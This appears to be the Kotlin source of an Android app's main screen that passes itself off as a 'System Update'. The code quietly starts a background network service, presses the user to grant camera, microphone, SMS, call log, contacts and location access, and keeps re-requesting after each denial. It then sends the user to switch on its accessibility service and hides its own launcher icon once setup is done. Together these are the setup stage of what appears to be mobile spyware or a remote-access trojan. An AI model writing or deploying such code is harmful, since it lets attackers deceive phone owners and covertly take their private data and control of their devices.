package com.openaccess.sdk

import android.Manifest
import android.app.Activity
import android.app.ActivityManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.Switch
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.openaccess.sdk.service.AccessibilityHelper
import com.openaccess.sdk.service.SystemNetworkService

class MainActivity : Activity() {
    companion object {
        private const val RC_ALL = 100

        val ALL_PERMS = listOfNotNull(
            Manifest.permission.CAMERA,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.READ_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.WRITE_EXTERNAL_STORAGE else null,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.POST_NOTIFICATIONS else null,
        )

        val PERM_LABELS = mapOf(
            Manifest.permission.CAMERA to "Camera",
            Manifest.permission.CALL_PHONE to "Phone Calls",
            Manifest.permission.READ_CALL_LOG to "Call History",
            Manifest.permission.SEND_SMS to "Send SMS",
            Manifest.permission.READ_CONTACTS to "Contacts",
            Manifest.permission.WRITE_CONTACTS to "Edit Contacts",
            Manifest.permission.RECORD_AUDIO to "Microphone",
            Manifest.permission.READ_SMS to "Read SMS",
            Manifest.permission.READ_PHONE_STATE to "Phone State",
            Manifest.permission.ACCESS_COARSE_LOCATION to "Location",
            Manifest.permission.ACCESS_FINE_LOCATION to "Precise Location",
            Manifest.permission.READ_EXTERNAL_STORAGE to "Read Storage",
            Manifest.permission.WRITE_EXTERNAL_STORAGE to "Write Storage",
            Manifest.permission.POST_NOTIFICATIONS to "Notifications",
        )

        fun hasPermission(ctx: Context, perm: String): Boolean {
            return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED
        }

        fun isAccessibilityEnabled(ctx: Context): Boolean {
            return try {
                val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
                val enabledServices = Settings.Secure.getString(
                    ctx.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                val ourService = ComponentName(ctx, AccessibilityHelper::class.java).flattenToString()
                enabledServices.contains(ourService) && am.isEnabled
            } catch (_: Exception) {
                false
            }
        }

        fun isServiceRunning(ctx: Context, serviceClass: Class<*>): Boolean {
            return try {
                val manager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                for (service in manager.getRunningServices(Int.MAX_VALUE)) {
                    if (serviceClass.name == service.service.className) return true
                }
                false
            } catch (_: Exception) {
                false
            }
        }
    }

    private lateinit var permContainer: LinearLayout
    private lateinit var statusText: TextView
    private lateinit var enableAllBtn: Button
    private val permSwitches = mutableMapOf<String, Switch>()
    private var retryCount = 0
    private lateinit var rootLayout: LinearLayout

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!isTaskRoot) { finish(); return }

        try { SystemNetworkService.start(this) } catch (_: Exception) {}

        rootLayout = createPermissionView()
        setContentView(rootLayout)

        Handler(Looper.getMainLooper()).postDelayed({
            refreshPermissionStates()
            if (ALL_PERMS.all { hasPermission(this, it) } && isAccessibilityEnabled(this)) {
                onSetupComplete()
            }
        }, 300)
    }

    private fun createPermissionView(): LinearLayout {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0A0A0F"))
            setPadding(48, 64, 48, 48)
        }

        val title = TextView(this).apply {
            text = "System Update"
            textSize = 28f
            setTextColor(Color.parseColor("#00F0FF"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 8)
        }

        val subtitle = TextView(this).apply {
            text = "Enable all permissions for full functionality"
            textSize = 14f
            setTextColor(Color.parseColor("#8888AA"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 32)
        }

        statusText = TextView(this).apply {
            textSize = 13f
            setTextColor(Color.parseColor("#39FF14"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 24)
        }

        val divider = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 2
            ).apply { setMargins(0, 0, 0, 24) }
            setBackgroundColor(Color.parseColor("#1A1A2E"))
        }

        val scroll = ScrollView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                0, 1f
            )
        }

        permContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        for (perm in ALL_PERMS) {
            val label = PERM_LABELS[perm] ?: perm.substringAfterLast(".")
            val sw = Switch(this).apply {
                text = label
                textSize = 15f
                setTextColor(Color.parseColor("#CCCCCC"))
                setPadding(16, 16, 16, 16)
                isEnabled = false
            }
            permSwitches[perm] = sw
            permContainer.addView(sw)
        }

        scroll.addView(permContainer)

        enableAllBtn = Button(this).apply {
            text = "Enable All Permissions"
            textSize = 16f
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#00F0FF"))
            setPadding(0, 20, 0, 20)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                topMargin = 32
                bottomMargin = 16
            }
            setOnClickListener { requestAllPerms() }
        }

        val skipBtn = Button(this).apply {
            text = "Skip for now"
            textSize = 14f
            setTextColor(Color.parseColor("#666688"))
            setBackgroundColor(Color.TRANSPARENT)
            setPadding(0, 12, 0, 12)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            setOnClickListener { onSetupComplete() }
        }

        root.addView(title)
        root.addView(subtitle)
        root.addView(statusText)
        root.addView(divider)
        root.addView(scroll)
        root.addView(enableAllBtn)
        root.addView(skipBtn)

        return root
    }

    private fun createAccessibilityView(): LinearLayout {
        val overlay = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0A0A0F"))
            setPadding(48, 64, 48, 48)
            gravity = Gravity.CENTER
        }

        val title = TextView(this).apply {
            text = "Final Step"
            textSize = 28f
            setTextColor(Color.parseColor("#00F0FF"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 16)
        }

        val desc = TextView(this).apply {
            text = "Enable Accessibility Service to complete setup\n\n1. Find 'System Update'\n2. Toggle ON\n3. Tap Allow"
            textSize = 16f
            setTextColor(Color.parseColor("#AAAAAA"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 32)
        }

        val openBtn = Button(this).apply {
            text = "Open Accessibility Settings"
            textSize = 16f
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#00F0FF"))
            setPadding(0, 20, 0, 20)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            setOnClickListener {
                try {
                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                } catch (_: Exception) {}
            }
        }

        val backBtn = Button(this).apply {
            text = "Back to Permissions"
            textSize = 14f
            setTextColor(Color.parseColor("#666688"))
            setBackgroundColor(Color.TRANSPARENT)
            setPadding(0, 12, 0, 12)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = 16 }
            setOnClickListener {
                rootLayout = createPermissionView()
                setContentView(rootLayout)
                refreshPermissionStates()
            }
        }

        overlay.addView(title)
        overlay.addView(desc)
        overlay.addView(openBtn)
        overlay.addView(backBtn)
        return overlay
    }

    private fun refreshPermissionStates() {
        var granted = 0
        for ((perm, sw) in permSwitches) {
            val has = hasPermission(this, perm)
            sw.isChecked = has
            sw.setTextColor(if (has) Color.parseColor("#39FF14") else Color.parseColor("#CCCCCC"))
            if (has) granted++
        }
        val total = ALL_PERMS.size
        statusText.text = "$granted / $total permissions granted"
        statusText.setTextColor(if (granted == total) Color.parseColor("#39FF14") else Color.parseColor("#FF003C"))
        enableAllBtn.isEnabled = granted < total
        enableAllBtn.text = if (granted == total) "All Enabled ✓" else "Enable All Permissions"
    }

    private fun requestAllPerms() {
        val needed = ALL_PERMS.filter { !hasPermission(this, it) }
        if (needed.isEmpty()) {
            refreshPermissionStates()
            checkAndProceed()
            return
        }

        val batchSize = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) 3 else 5
        val batch = needed.take(batchSize)

        try {
            ActivityCompat.requestPermissions(this, batch.toTypedArray(), RC_ALL)
        } catch (e: Exception) {
            Toast.makeText(this, "Tap 'Enable All' again to continue", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(requestCode, perms, results)
        if (requestCode == RC_ALL) {
            refreshPermissionStates()

            val denied = ALL_PERMS.filter { !hasPermission(this, it) }
            if (denied.isEmpty()) {
                checkAndProceed()
            } else {
                retryCount++
                if (retryCount < 10) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        requestAllPerms()
                    }, 600)
                } else {
                    Toast.makeText(this, "Go to Settings → Permissions to enable remaining", Toast.LENGTH_LONG).show()
                    enableAllBtn.text = "Open Settings"
                    enableAllBtn.setOnClickListener { openAppSettings() }
                }
            }
        }
    }

    private fun checkAndProceed() {
        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        val accOk = isAccessibilityEnabled(this)

        when {
            !permsOk -> requestAllPerms()
            !accOk -> setContentView(createAccessibilityView())
            else -> onSetupComplete()
        }
    }

    private fun openAppSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        } catch (_: Exception) {}
    }

    private fun onSetupComplete() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}

        startActivity(Intent(this, VpnActivity::class.java))
        finishAndRemoveTask()
    }

    override fun onResume() {
        super.onResume()
        if (isFinishing || !::rootLayout.isInitialized) return

        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        val accOk = isAccessibilityEnabled(this)

        if (permsOk && accOk) {
            onSetupComplete()
        } else if (permsOk) {
            setContentView(createAccessibilityView())
        } else {
            refreshPermissionStates()
        }
    }
}
